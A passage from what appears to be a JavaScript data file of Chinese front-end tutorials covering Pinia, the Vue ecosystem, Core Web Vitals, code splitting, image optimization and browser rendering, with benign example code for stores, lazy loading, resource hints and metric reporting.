- 性能优化策略`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"vue-pinia",title:"Pinia 状态管理",category:"vue",difficulty:"medium",tags:["Vue","Pinia","状态管理","Store"],content:`## Pinia 状态管理

Pinia 是 Vue 3 官方推荐的状态管理库，替代了 Vuex，提供了更简洁的 API 和更好的 TypeScript 支持。

### Pinia 简介

**Pinia 与 Vuex 的区别：**
- 更简洁的 API，无需 mutations
- 更好的 TypeScript 支持
- 支持组合式 API
- 更小的包体积
- 更灵活的存储结构

**安装：**
- npm install pinia
- Vue 3：app.use(createPinia())：Vue 3使用createPinia()创建Pinia实例，通过app.use()方法注册到Vue应用，Pinia是Vue 3官方推荐的状态管理库，提供了更简洁的API、更好的TypeScript支持、模块化状态管理、自动订阅等特性，是Vue 3项目状态管理的首选
- Vue 2：需要 @vue/composition-api：Vue 2使用Pinia需要安装@vue/composition-api插件来支持Composition API，配置后可以在Vue 2项目中使用createPinia()创建状态存储，@vue/composition-api是Vue 2使用Composition API的官方适配器，使得Vue 2也可以享受Composition API带来的代码组织优势

### 基本使用

**创建 Store：**
- defineStore() 函数
- 第一个参数是 store 的唯一 ID
- 第二个参数是 store 的配置

**State：**
- 定义初始状态
- 可以是函数或对象
- 响应式数据

**Getters：**
- 计算属性
- 自动缓存
- 可以访问其他 getters

**Actions：**
- 异步操作
- 可以提交状态更改
- 可以访问其他 actions

### Store 配置

**State 定义：**

\`\`\`javascript
export const useCounterStore = defineStore('counter', {
  state: () => ({
    count: 0,
    name: 'Pinia'
  }),
  getters: {
    doubleCount: (state) => state.count * 2,
    doubleCountPlusOne: (state, getters) => getters.doubleCount + 1
  },
  actions: {
    increment() {
      this.count++
    },
    async incrementAsync() {
      await new Promise(resolve => setTimeout(resolve, 1000))
      this.count++
    }
  }
})
\`\`\`

**组件中使用：**

\`\`\`javascript
import { useCounterStore } from '@/stores/counter'

export default {
  setup() {
    const store = useCounterStore()
    
    return {
      store,
      increment: () => store.increment()
    }
  }
}
\`\`\`

### 高级特性

**模块化：**
- 按功能创建多个 store
- 模块之间可以相互访问
- 更好的代码组织

**持久化：**
- pinia-plugin-persistedstate
- 自动保存到 localStorage
- 支持自定义存储

**插件系统：**
- 扩展 Pinia 功能
- 自定义插件
- 官方插件生态

**调试：**
- Vue DevTools 支持：Vue DevTools是Vue官方浏览器扩展，提供组件树检查、组件状态查看、Vuex状态管理、时间旅行调试等功能，可以直观地查看组件层级、数据状态、事件流，是Vue开发调试的必备工具，支持Vue 2和Vue 3，在Chrome和Firefox商店可以安装
- 时间旅行
- 状态快照

### 最佳实践

- 按功能划分 store
- 使用 TypeScript 类型
- 合理使用 actions 处理异步
- 避免直接修改 state
- 测试 store 逻辑
- 性能优化策略`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"vue-ecosystem",title:"Vue 生态系统与工具链",category:"vue",difficulty:"medium",tags:["Vue","生态系统","工具链","CLI"],content:`## Vue 生态系统与工具链

Vue 生态系统丰富多样，包括官方工具和社区工具，为开发提供了完整的解决方案。

### Vue CLI

**功能：**
- 脚手架工具
- 项目初始化
- 开发服务器
- 构建工具
- 插件系统

**安装：**
- npm install -g @vue/cli
- vue create project-name
- 交互式配置

**配置：**
- vue.config.js
- 自定义 webpack 配置
- 环境变量

### Vite

**特点：**
- 快速的开发服务器
- 按需编译
- 热模块替换
- 生产构建
- 支持多种框架

**创建项目：**
- npm create vite@latest project-name -- --template vue
- npm create vite@latest project-name -- --template vue-ts

**配置：**
- vite.config.js
- 插件系统
- 环境变量

### 官方工具

**Vue DevTools：**
- 浏览器扩展
- 组件树查看
- 状态管理
- 性能分析
- 时间旅行

**Vue Test Utils：**
- 测试库
- 组件测试
- 挂载组件
- 模拟用户交互

**Vue Router：**
- 官方路由
- 单页应用
- 路由守卫
- 懒加载

**Pinia：**
- 官方状态管理
- 替代 Vuex
- 简洁 API
- TypeScript 支持：Vue 3对TypeScript提供了更好的原生支持，Vue 3核心库使用TypeScript重写，提供了完整的类型定义，Composition API的setup函数可以直接返回类型化的数据，Vue Router 4和Pinia也都使用TypeScript编写，Vue项目的TypeScript支持已经非常成熟

### 社区工具

**UI 库：**
- Element Plus：Element Plus是Element UI的Vue 3版本，由饿了么团队开发维护，提供丰富的企业级UI组件，组件设计美观、功能完善、文档详尽，支持按需引入和主题定制，是国内Vue项目最常用的组件库之一，适合快速构建管理后台和业务系统
- Ant Design Vue：Ant Design Vue是Ant Design的Vue实现，由蚂蚁金服团队开发，提供企业级UI组件库，组件设计遵循Ant Design设计规范，适合构建中后台系统，提供了完整的数据展示、表单、导航、反馈等组件，支持Tree Shaking按需加载
- Vuetify：Vuetify是Material Design风格的Vue UI框架，提供丰富的Material Design组件，支持Vue 2和Vue 3，组件外观美观、功能完善，提供了预制主题和自定义主题功能，适合需要Material Design风格的项目，是Vue生态中最流行的UI框架之一
- Quasar：Quasar是功能丰富的Vue框架，可以同时构建响应式网站、PWA、移动应用、桌面应用，一套代码多端部署，提供了大量高质量组件，详尽的文档和活跃的社区，支持Material Design和iOS风格主题，适合需要跨平台的项目
- Naive UI：Naive UI是Vue 3的UI组件库，组件设计现代简约，TypeScript友好，提供了完善的主题定制功能，组件体积适中，性能良好，文档清晰易读，适合需要简洁美观UI的Vue 3项目

**表单处理：**
- VeeValidate：VeeValidate是Vue生态中流行的表单验证库，支持Vue 2和Vue 3，提供了声明式的验证规则定义，可以与Yup配合使用，组件化和Hook两种使用方式，提供了Form、Field、ErrorMessage等组件，支持自定义验证规则，是Vue表单验证的常用选择
- Element Plus 表单：Element Plus提供了完整的表单组件和验证功能，包括Form、FormItem、Input、Select等组件，支持响应式布局、动态表单、表单验证等特性，验证规则可以与Async Validator配合使用，是使用Element Plus构建表单的便捷方式
- FormKit：FormKit是Vue 3的表单框架，提供了完整的表单解决方案，包括表单生成、表单验证、错误处理等功能，提供了useForm、useField等Composable，TypeScript支持完善，支持多种输入类型和自定义输入组件，是现代Vue表单开发的新选择

**动画库：**
- Vue Transition：Vue内置的过渡组件，提供CSS过渡和动画支持，通过transition组件包裹元素实现进入、离开、列表过渡效果，支持自定义CSS类名、JavaScript钩子函数，可以创建简单的淡入淡出、滑动等动画效果，是Vue最基础的动画解决方案
- Vueuse Motion：VueUse是Vue 3的组合式工具库，Vueuse Motion是其动画模块，提供声明式的动画API，基于VueUse的Composable设计，支持手势动画、滚动动画、列表动画等，可以与Vue Transition配合使用，适合需要复杂交互动画的Vue项目
- Lottie Vue：Lottie Vue是Airbnb Lottie动画库的Vue实现，可以在Vue项目中播放After Effects导出的JSON动画，提供lottie-vue-next（Vue 3）和vue-lottie（Vue 2）两个版本，支持动画播放控制、循环、速度调节等功能，适合需要高质量动画效果的Vue项目

**HTTP 客户端：**
- Axios：Axios是基于Promise的HTTP客户端，可以在浏览器和Node.js中使用，提供简洁的API支持GET、POST等HTTP方法，自动转换JSON数据，支持请求和响应拦截器、取消请求、超时处理等功能，是Vue项目中最常用的HTTP客户端库，可以与Vue的请求库如vue-resource配合或单独使用
- Fetch API：Fetch API是浏览器原生提供的HTTP请求API，基于Promise设计，支持Request和Response对象，可以进行更细粒度的请求控制，Fetch API是现代浏览器标准API，不需要额外引入库，但在某些场景下功能不如Axios丰富（如请求取消），可以使用Fetch API配合Vue的async/await语法进行数据请求
- TanStack Query：TanStack Query（之前叫Vue Query）是Vue的数据请求和缓存管理库，提供声明式的数据获取、缓存、轮询、乐观更新等功能，自动管理请求状态和缓存，支持后台刷新、预取、并行请求等高级特性，大大简化了Vue中的数据请求逻辑，是Vue项目数据管理的有力工具

### 构建工具

**Webpack：**
- 传统构建工具
- 强大的配置
- 生态丰富

**Rollup：**
- 适合库构建
-  tree-shaking
- 更小的包体积

**ESBuild：**
- 极快的构建速度
- 由 Go 语言编写
- 用于开发环境

### 部署工具

**Vercel：**
- 静态网站托管
- 自动部署
- 预览环境

**Netlify：**
- 静态网站托管
- 持续部署
- 表单处理

**GitHub Pages：**
- 免费托管
- 与 GitHub 集成
- 适合静态网站

### 最佳实践

- 使用 Vite 进行开发
- 选择合适的 UI 库
- 集成 TypeScript
- 配置 ESLint 和 Prettier
- 建立 CI/CD 流程
- 监控和分析性能
- 持续学习生态新特性`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"core-web-vitals",title:"Core Web Vitals 核心指标优化",category:"performance",difficulty:"medium",tags:["性能优化","Core Web Vitals","LCP","FID","CLS"],content:`## Core Web Vitals 核心指标优化

Core Web Vitals 是 Google 推出的用户体验核心指标，包括 LCP、FID 和 CLS，对网站的 SEO 和用户体验至关重要。

### ⚡ LCP (Largest Contentful Paint)

**定义：**
- **最大内容绘制时间**
- **衡量页面主要内容加载完成的时间**
- **目标值：< 2.5秒**：LCP的目标是确保用户能够在2.5秒内看到页面的主要内容，这个阈值基于大量用户体验研究得出，2.5秒以内的LCP被认为是良好的用户体验，超过2.5秒需要改进，超过4秒则被认为较差的体验，LCP是Core Web Vitals中最重要的指标，直接影响用户对页面加载速度的感知

**优化策略：**
- **优化服务器响应时间**
- **使用 CDN 分发静态资源**
- **预加载关键资源**
- **优化图片大小和格式**
- **减少第三方脚本阻塞**

**监控工具：**
- **Google PageSpeed Insights**
- **Lighthouse**
- **Web Vitals Chrome 扩展**

### 💻 代码示例：LCP 优化

\`\`\`html
<!-- 预加载关键资源 -->
<link rel="preload" as="image" href="/hero-image.webp">
<link rel="preload" as="font" href="/fonts/main.woff2" crossorigin>
<link rel="preload" as="style" href="/styles/main.css">

<!-- 预连接到重要域名 -->
<link rel="preconnect" href="https://cdn.example.com">
<link rel="dns-prefetch" href="https://api.example.com">

<!-- 优化图片 -->
<picture>
  <source srcset="/hero-image.avif" type="image/avif">
  <source srcset="/hero-image.webp" type="image/webp">
  <img src="/hero-image.jpg" alt="Hero Image" loading="eager" width="1200" height="600">
</picture>
\`\`\`

#### LCP 监控示例

\`\`\`javascript
// 使用 Web Vitals 库监控 LCP
import { onLCP } from 'web-vitals';

onLCP((metric) => {
  console.log('LCP:', metric);
  
  // 发送到分析服务
  if (navigator.sendBeacon) {
    const data = new URLSearchParams();
    data.set('name', metric.name);
    data.set('value', metric.value.toString());
    data.set('id', metric.id);
    
    navigator.sendBeacon('/analytics', data);
  }
  
  // 判断是否达标
  if (metric.rating === 'good') {
    console.log('LCP is good!');
  } else if (metric.rating === 'needs-improvement') {
    console.warn('LCP needs improvement');
  } else {
    console.error('LCP is poor!');
  }
});
\`\`\`

### FID (First Input Delay)

**定义：**
- 首次输入延迟
- 衡量用户首次与页面交互到浏览器响应的时间
- 目标值：< 100ms：FID用于衡量用户首次与页面交互（如点击按钮、输入文字）时，浏览器能够多快地响应，这个指标关注的是页面的可交互性而非加载速度，100ms以内的延迟被认为是良好的用户体验，超过300ms则被认为较差的体验，FID主要受JavaScript执行时间和主线程阻塞程度影响，优化FID的关键是减少主线程的工作量

**优化策略：**
- 减少 JavaScript 执行时间
- 代码分割和懒加载
- 使用 Web Workers 处理耗时任务
- 优化第三方脚本
- 避免长任务阻塞主线程

**监控工具：**
- Chrome DevTools Performance 面板
- Web Vitals 库
- Google Search Console

### 代码示例

#### FID 优化示例

\`\`\`javascript
// 代码分割和懒加载
// 使用动态 import
const loadHeavyComponent = async () => {
  const module = await import('./HeavyComponent');
  return module.default;
};

// 使用 React.lazy
import React, { Suspense } from 'react';

const HeavyComponent = React.lazy(() => import('./HeavyComponent'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <HeavyComponent />
    </Suspense>
  );
}

// 使用 Web Workers
// worker.js
self.onmessage = function(e) {
  const result = heavyComputation(e.data);
  self.postMessage(result);
};

// main.js
const worker = new Worker('worker.js');

worker.onmessage = function(e) {
  console.log('Result:', e.data);
};

worker.postMessage(data);

// 避免长任务
function processLargeArray(array, chunkSize = 1000) {
  let index = 0;
  
  function processChunk() {
    const chunk = array.slice(index, index + chunkSize);
    // 处理数据块
    chunk.forEach(item => {
      // 处理逻辑
    });
    
    index += chunkSize;
    
    if (index < array.length) {
      // 使用 requestIdleCallback 或 setTimeout 避免阻塞主线程
      requestIdleCallback(processChunk, { timeout: 50 });
    }
  }
  
  processChunk();
}
\`\`\`

#### FID 监控示例

\`\`\`javascript
// 使用 Web Vitals 库监控 FID
import { onFID } from 'web-vitals';

onFID((metric) => {
  console.log('FID:', metric);
  
  // 发送到分析服务
  if (navigator.sendBeacon) {
    const data = new URLSearchParams();
    data.set('name', metric.name);
    data.set('value', metric.value.toString());
    data.set('id', metric.id);
    
    navigator.sendBeacon('/analytics', data);
  }
  
  // 判断是否达标
  if (metric.rating === 'good') {
    console.log('FID is good!');
  } else if (metric.rating === 'needs-improvement') {
    console.warn('FID needs improvement');
  } else {
    console.error('FID is poor!');
  }
});
\`\`\`

### CLS (Cumulative Layout Shift)

**定义：**
- 累积布局偏移
- 衡量页面元素意外移动的程度
- 目标值：< 0.1：CLS用于衡量页面视觉稳定性，即页面在加载过程中视觉元素意外移动的程度，0.1以下的CLS被认为是良好的用户体验，超过0.25被认为较差，CLS主要由动态加载的内容（如图片、字体、动态广告等）导致布局偏移引起，优化CLS的关键是为图片和视频指定明确的尺寸、使用CSS transform而非改变元素位置、确保广告或动态内容有预留空间

**优化策略：**
- 为图片和视频设置明确的宽高
- 为广告和动态内容预留空间
- 避免在页面加载后插入内容
- 使用 CSS aspect-ratio 属性
- 优化字体加载策略

**监控工具：**
- Lighthouse
- Web Vitals Chrome 扩展
- Google Search Console

### 代码示例

#### CLS 优化示例

\`\`\`html
<!-- 为图片设置明确的宽高 -->
<img src="/image.jpg" alt="Image" width="800" height="600">

<!-- 使用 aspect-ratio 属性 -->
<style>
.image-container {
  aspect-ratio: 16 / 9;
  background-color: #f0f0f0;
}
</style>

<div class="image-container">
  <img src="/image.jpg" alt="Image" loading="lazy">
</div>

<!-- 为动态内容预留空间 -->
<div class="ad-container" style="min-height: 250px;">
  <!-- 广告内容 -->
</div>

<!-- 使用 font-display 优化字体加载 -->
<style>
@font-face {
  font-family: 'Custom Font';
  src: url('/fonts/custom.woff2') format('woff2');
  font-display: swap; /* 或 optional, fallback */
}
</style>

<!-- 避免在页面加载后插入内容 -->
<!-- 不推荐 -->
<script>
document.body.appendChild(createDynamicContent());
</script>

<!-- 推荐 -->
<div id="dynamic-content" style="min-height: 200px;">
  <!-- 动态内容将在这里加载 -->
</div>
\`\`\`

#### CLS 监控示例

\`\`\`javascript
// 使用 Web Vitals 库监控 CLS
import { onCLS } from 'web-vitals';

onCLS((metric) => {
  console.log('CLS:', metric);
  
  // 发送到分析服务
  if (navigator.sendBeacon) {
    const data = new URLSearchParams();
    data.set('name', metric.name);
    data.set('value', metric.value.toString());
    data.set('id', metric.id);
    
    navigator.sendBeacon('/analytics', data);
  }
  
  // 判断是否达标
  if (metric.rating === 'good') {
    console.log('CLS is good!');
  } else if (metric.rating === 'needs-improvement') {
    console.warn('CLS needs improvement');
  } else {
    console.error('CLS is poor!');
  }
});
\`\`\`

### 整体优化策略

**资源优化：**
- 压缩 CSS、JavaScript 和 HTML
- 使用现代图片格式（WebP、AVIF）
- 启用 GZIP 或 Brotli 压缩
- 合理使用缓存策略

**加载策略：**
- 预加载关键资源
- 延迟加载非关键资源
- 预连接到重要域名
- 资源提示（dns-prefetch、preconnect、preload）

**代码优化：**
- 减少 JavaScript 包大小
- 避免内存泄漏
- 优化 DOM 操作
- 使用 requestAnimationFrame 处理动画

**服务器优化：**
- 启用 HTTP/2 或 HTTP/3

### 代码示例

#### 资源优化示例

\`\`\`javascript
// Webpack 配置优化
module.exports = {
  optimization: {
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        vendors: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendors',
          chunks: 'all'
        }
      }
    },
    minimize: true,
    minimizer: [
      new TerserPlugin({
        terserOptions: {
          compress: {
            drop_console: true
          }
        }
      })
    ]
  },
  performance: {
    hints: 'warning',
    maxEntrypointSize: 512000,
    maxAssetSize: 512000
  }
};

// 图片优化
// 使用 next/image (Next.js)
import Image from 'next/image';

function MyComponent() {
  return (
    <Image
      src="/hero-image.jpg"
      alt="Hero Image"
      width={1200}
      height={600}
      priority
      placeholder="blur"
    />
  );
}

// 使用响应式图片
<picture>
  <source media="(max-width: 600px)" srcset="/image-small.webp">
  <source media="(max-width: 1200px)" srcset="/image-medium.webp">
  <source srcset="/image-large.webp">
  <img src="/image-fallback.jpg" alt="Responsive Image">
</picture>
\`\`\`

#### 加载策略示例

\`\`\`html
<!-- 资源提示 -->
<head>
  <!-- DNS 预解析 -->
  <link rel="dns-prefetch" href="https://api.example.com">
  
  <!-- 预连接 -->
  <link rel="preconnect" href="https://cdn.example.com">
  
  <!-- 预加载 -->
  <link rel="preload" as="script" href="/scripts/main.js">
  <link rel="preload" as="style" href="/styles/main.css">
  <link rel="preload" as="image" href="/images/hero.webp">
  
  <!-- 预获取 -->
  <link rel="prefetch" href="/next-page.html">
</head>

<!-- 懒加载图片 -->
<img src="/image.jpg" alt="Image" loading="lazy">

<!-- 懒加载 iframe -->
<iframe src="/video.html" loading="lazy"></iframe>
\`\`\`

#### 代码优化示例

\`\`\`javascript
// 减少 DOM 操作
// 不推荐
function updateList(items) {
  const list = document.getElementById('list');
  list.innerHTML = '';
  
  items.forEach(item => {
    const li = document.createElement('li');
    li.textContent = item;
    list.appendChild(li);
  });
}

// 推荐：使用文档片段
function updateList(items) {
  const list = document.getElementById('list');
  const fragment = document.createDocumentFragment();
  
  items.forEach(item => {
    const li = document.createElement('li');
    li.textContent = item;
    fragment.appendChild(li);
  });
  
  list.innerHTML = '';
  list.appendChild(fragment);
}

// 使用 requestAnimationFrame 处理动画
function animate() {
  // 更新动画状态
  updateAnimation();
  
  requestAnimationFrame(animate);
}

requestAnimationFrame(animate);

// 避免内存泄漏
// 不推荐
function setupEventListeners() {
  const button = document.getElementById('button');
  button.addEventListener('click', handleClick);
  // 如果不移除监听器，会导致内存泄漏
}

// 推荐
function setupEventListeners() {
  const button = document.getElementById('button');
  const handleClick = () => {
    // 处理点击
  };
  
  button.addEventListener('click', handleClick);
  
  // 清理函数
  return () => {
    button.removeEventListener('click', handleClick);
  };
}

const cleanup = setupEventListeners();

// 在组件卸载时调用
// cleanup();
\`\`\`

### 最佳实践

- 定期监控 Core Web Vitals 指标
- 优先优化 LCP，因为它对用户体验影响最大
- 使用现代图片格式和压缩技术
- 合理使用代码分割和懒加载
- 避免长任务阻塞主线程
- 为图片和动态内容预留空间
- 优化字体加载策略
- 使用 CDN 加速静态资源
- 启用 HTTP/2 或 HTTP/3
- 定期进行性能审计

`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"code-splitting",title:"代码分割与懒加载",category:"performance",difficulty:"medium",tags:["性能优化","代码分割","懒加载","webpack"],content:`## 代码分割与懒加载

代码分割和懒加载是减少初始加载时间、提高应用性能的重要策略。

### 代码分割的概念

**定义：**
- 将代码分割成多个小块
- 按需加载这些代码块
- 减少初始加载体积
- 提高首次内容绘制速度

**分割策略：**
- 按路由分割
- 按组件分割
- 按功能分割
- 按第三方库分割

### 懒加载技术

**动态导入：**
- ES 模块动态导入语法
- import() 函数
- 返回 Promise
- 支持 webpack 代码分割

**React 中的实现：**
- React.lazy()
- Suspense 组件
- 路由级别的代码分割
- 组件级别的代码分割

**Vue 中的实现：**
- 路由懒加载
- 动态导入组件
- defineAsyncComponent
- webpackChunkName 注释

### Webpack 配置

**SplitChunks 配置：**
- chunks 选项：async、initial、all：chunks选项用于指定代码分割的模式，async表示只分割异步导入的模块（动态import），这些模块会在需要时异步加载；initial表示只分割入口模块的同步依赖；all表示同时处理异步和同步模块，这个选项决定了哪些模块会被分割成独立的chunk文件，合理设置可以优化首屏加载时间和后续模块的按需加载
- minSize：最小 chunk 大小：minSize选项指定生成chunk的最小字节数，默认值为20000（20KB），当一个模块或模块组的大小小于这个值时，不会生成独立的chunk，这个值可以根据项目需求调整，较大的值会生成更少但更大的chunk，有利于减少HTTP请求数，但可能会影响首屏加载速度
- maxSize：最大 chunk 大小：maxSize选项指定生成chunk的最大字节数，默认值为0（无限制），当chunk大小超过这个值时，webpack会尝试将其分割成更小的chunk，这个选项主要用于控制浏览器缓存效率和网络请求数量，设置合适的值可以在缓存命中率和请求数量之间取得平衡，通常设置为大于等于minSize的值
- minChunks：最小引用次数：minChunks选项指定一个模块必须被多少个入口chunk引用才会被分割，默认值为1，意味着只要被引用一次就可能分割，如果设置为更大的值，只有被多个入口共同引用的模块才会被分割出来作为共享模块，这在多个入口共享某些库（如React、Lodash）时很有用，可以避免重复打包
- maxAsyncRequests：最大异步请求数：maxAsyncRequests选项指定按需加载时的最大并行请求数，默认值为6，当异步加载的chunk数量超过这个值时，会等待之前的chunk加载完成后再请求下一个，这个值影响按需加载的性能，设置太大会增加并发请求数，设置太小会延长加载时间，通常保持默认即可
- maxInitialRequests：最大初始请求数：maxInitialRequests选项指定初始加载（入口点）时的最大并行请求数，默认值为4，这个值影响首屏加载性能，因为浏览器对并行请求数有限制（通常为6个），设置合理的值可以平衡首屏加载速度和HTTP请求数，在HTTP/2环境下可以设置更大的值以充分利用多路复用优势

**代码分割策略：**
- 提取公共代码
- 提取第三方库
- 提取运行时代码
- 自定义分割策略

### 预加载与预缓存

**预加载：**
- preload：预加载关键资源：preload是一种资源提示（Resource Hint），用于提前告诉浏览器当前页面需要的关键资源，让浏览器提前开始加载，通过<link rel="preload">标签指定，as属性告诉浏览器资源的类型（script、style、image、font等），这样浏览器可以设置正确的优先级和预获取资源，preload适合预加载首屏渲染所需的关键资源，如关键CSS、字体、首屏图片等
- prefetch：预加载未来可能需要的资源：prefetch是一种资源提示，用于告诉浏览器在当前页面加载完成后，预测用户可能访问的下一个页面或需要的资源，让浏览器在空闲时预加载这些资源，通过<link rel="prefetch">标签指定，prefetch适合预加载下一个路由的代码、非首屏图片等资源，可以显著提升用户后续操作的加载速度，但不应过度使用以免浪费带宽
- preconnect：预连接到域名：preconnect是一种资源提示，用于提前与目标服务器建立网络连接，包括DNS解析、TCP握手、TLS握手等，通过<link rel="preconnect">标签指定href属性为目标域名，preconnect可以显著减少后续请求的延迟，特别适合连接CDN服务器、API服务器、第三方资源服务器等，使用时需要注意只预连接真正需要的域名，过度使用会浪费DNS缓存资源
- dns-prefetch：预解析 DNS：dns-prefetch是一种资源提示，用于提前解析目标域名的DNS，将域名解析为IP地址，通过<link rel="dns-prefetch">标签指定href属性为目标域名，dns-prefetch适合提前解析第三方域名（如CDN、分析服务、广告服务等）的DNS，可以减少后续请求的DNS解析时间，注意dns-prefetch和preconnect可以一起使用，preconnect会包含DNS预解析

**Service Worker：**
- 缓存静态资源
- 离线访问
- 预缓存关键资源
- 背景同步

### 性能影响

**优势：**
- 减少初始加载时间
- 提高首屏渲染速度
- 节省带宽
- 改善用户体验

**注意事项：**
- 避免过度分割
- 合理设置分割策略
- 监控分割效果
- 考虑缓存策略

### 最佳实践

- 按路由分割代码
- 懒加载非关键组件
- 预加载关键资源
- 合理使用预缓存
- 监控代码分割效果
- 优化分割策略
- 考虑用户网络环境
- 平衡分割粒度`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"image-optimization",title:"图片优化策略",category:"performance",difficulty:"medium",tags:["性能优化","图片优化","WebP","响应式图片"],content:`## 图片优化策略

图片是网页中最常见的资源，也是影响页面加载速度的主要因素，合理的图片优化策略可以显著提升性能。

### 图片格式选择

**WebP：**
- 由 Google 开发的现代图片格式
- 比 JPEG 小 25-35%
- 支持透明和动画
- 浏览器支持良好

**AVIF：**
- 基于 AV1 视频编码
- 比 WebP 小 20-30%
- 支持 HDR 和宽色域
- 浏览器支持正在增加

**JPEG：**
- 适合照片和复杂图像
- 有损压缩
- 广泛支持
- 可调节压缩质量

**PNG：**
- 支持透明
- 无损压缩
- 适合图标和简单图形
- 文件体积较大

**SVG：**
- 矢量图形
- 无限缩放
- 适合图标和简单图形
- 可通过 CSS 和 JavaScript 操作

### 图片压缩

**有损压缩：**
- 减少文件大小
- 适当降低质量
- 肉眼难以察觉差异
- 适合照片

**无损压缩：**
- 移除元数据
- 优化压缩算法
- 保持原始质量
- 适合图标和图形

**工具：**
- ImageOptim
- TinyPNG
- Squoosh
- Sharp (Node.js)
- ImageMagick

### 响应式图片

**srcset 属性：**
- 提供多个图片源
- 浏览器根据设备选择合适的图片
- 支持不同分辨率
- 语法：srcset="image-1x.jpg 1x, image-2x.jpg 2x"：srcset属性允许在不同像素密度的屏幕上提供不同分辨率的图片，语法格式是"图片URL 像素密度"，如1x表示标准像素密度、2x表示Retina屏幕的高像素密度，浏览器会根据设备的像素比自动选择合适的图片，这个属性可以避免在低分辨率设备上加载过大的图片，节省带宽并提高加载速度

**sizes 属性：**
- 定义图片在不同视口中的尺寸
- 与 srcset 配合使用
- 帮助浏览器选择合适的图片
- 语法：sizes="(max-width: 600px) 100vw, 50vw"：sizes属性与srcset配合使用，用于告诉浏览器在不同视口宽度下图片的显示尺寸，语法是媒体条件加上对应的宽度值，如"(max-width: 600px) 100vw"表示视口宽度不超过600px时图片宽度为100%视口宽度，", 50vw"表示其他情况下图片宽度为50%视口宽度，这个属性帮助浏览器选择最合适的图片分辨率，避免加载过大的图片

**picture 元素：**
- 提供多个图片源
- 基于媒体查询选择
- 支持不同格式
- 语法：<picture><source media="..." srcset="..."><img src="..."></picture>：picture元素允许通过多个source元素为不同场景提供不同的图片源，source元素的media属性指定媒体查询条件，srcset属性指定图片URL，当浏览器匹配到某个source的媒体条件时就会使用该source的图片，如果都不匹配则使用img元素的src作为后备，picture元素常用于艺术方向（不同屏幕宽度显示不同裁剪的图片）或提供不同格式的图片（如WebP、AVIF）

### 图片加载策略

**懒加载：**
- 延迟加载视口外的图片
- 减少初始加载时间
- 节省带宽
- 实现方式：Intersection Observer API：Intersection Observer API是浏览器提供的异步观察元素可见性的API，可以高效地检测元素是否进入或离开视口，相比于传统的scroll事件监听，Intersection Observer不会导致主线程阻塞，性能更好，使用时创建Observer实例并配置rootMargin（视口外延）和threshold（触发阈值），当元素可见性变化时调用回调函数，是实现图片懒加载的首选方案

**预加载：**
- 预加载关键图片
- 提高首屏渲染速度
- 使用 preload 指令
- 语法：<link rel="preload" as="image" href="image.jpg">：preload可以用于预加载首屏图片，让浏览器提前开始下载图片资源，as属性指定资源类型为image，href指定图片URL，这样在图片需要显示时可以立即使用缓存或已完成下载的图片，避免加载延迟，preload适合首屏关键图片如hero图片，但不应预加载过多图片以免与关键资源争抢带宽

**渐进式加载：**
- 先加载低质量占位图
- 再加载完整图片
- 改善用户体验
- 实现方式：BlurHash、Lqip：BlurHash（模糊哈希）是一种紧凑的占位符编码算法，将图片编码为一个短字符串，在图片加载完成前先显示模糊的占位图，然后平滑过渡到完整图片，提供良好的用户体验，Lqip（Low Quality Image Placeholder）是低质量图片占位符技术，生成非常小的缩略图作为占位图，这两种技术都可以在保证用户体验的同时减少带宽消耗

### CDN 与缓存

**CDN：**
- 内容分发网络
- 就近访问图片
- 提高加载速度
- 减轻源服务器负担

**缓存策略：**
- 设置合理的缓存头
- 使用 ETag 和 Last-Modified
- 版本化文件名
- 利用浏览器缓存

### 最佳实践

- 使用现代图片格式（WebP、AVIF）
- 适当压缩图片
- 实现响应式图片
- 懒加载非关键图片
- 预加载关键图片
- 使用 CDN 分发图片
- 合理设置缓存策略
- 监控图片加载性能
- 定期优化图片资源`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"browser-rendering",title:"浏览器渲染优化",category:"performance",difficulty:"medium",tags:["性能优化","浏览器渲染","回流","重绘","合成层"],content:`## 浏览器渲染优化

理解浏览器的渲染过程，针对性地进行优化，可以显著提升页面的渲染性能和用户体验。浏览器渲染是一个复杂的过程，从接收HTML、CSS、JavaScript等资源，到最终在屏幕上显示像素，涉及多个阶段。每个阶段都可能成为性能瓶颈，理解这些阶段的工作原理对于前端性能优化至关重要。

### 渲染流程详解

**HTML 解析：**
浏览器解析 HTML 生成 DOM 树是渲染流程的第一步。解析器从网络层获取HTML字节流，将其转换为字符，然后进行词法分析生成标记（Token），最后根据标记构建DOM树。解析过程中遇到CSS会暂停HTML解析，因为CSS可能影响后续的渲染；遇到JavaScript也会暂停，因为JavaScript可能修改DOM结构。现代浏览器使用预解析器（Preload Scanner）来提前发现需要加载的资源，优化加载顺序。

\`\`\`javascript
// DOM 树结构示例
// HTML:
// <div class="container">
//   <h1>Title</h1>
//   <p>Paragraph</p>
// </div>

// DOM 树:
// Document
//   └── html
//        ├── head
//        └── body
//             └── div.container
//                  ├── h1
//                  │    └── "Title"
//                  └── p
//                       └── "Paragraph"
\`\`\`

**CSS 解析：**
CSS解析生成CSSOM树是渲染流程的关键步骤。浏览器将CSS代码转换为CSS对象模型（CSSOM），CSSOM与DOM树结合生成渲染树（Render Tree）。渲染树只包含可见元素，不包含display:none的元素。CSS选择器从右向左匹配，因此复杂的选择器会影响解析性能。CSS的加载和解析会阻塞渲染，建议将关键CSS内联，非关键CSS异步加载。

\`\`\`javascript
// CSSOM 树结构示例
// CSS:
// .container { width: 100%; }
// .container h1 { color: blue; }
// .container p { font-size: 14px; }

// CSSOM 树:
// body
//   └── .container (width: 100%)
//        ├── h1 (color: blue)
//        └── p (font-size: 14px)

// 渲染树 = DOM 树 + CSSOM 树
// 只包含可见元素，visibility: hidden 的元素在渲染树中
// display: none 的元素不在渲染树中
\`\`\`

**布局 (Layout)：**
布局阶段计算元素的位置和大小，也称为回流（Reflow）。这是一个递归过程，从根元素开始，遍历渲染树中的每个元素，计算其几何属性。布局是渲染过程中最昂贵的操作之一，因为它需要遍历整个渲染树。触发回流的操作包括：添加/删除元素、改变元素尺寸、改变窗口大小、改变字体大小等。减少回流是性能优化的重点。

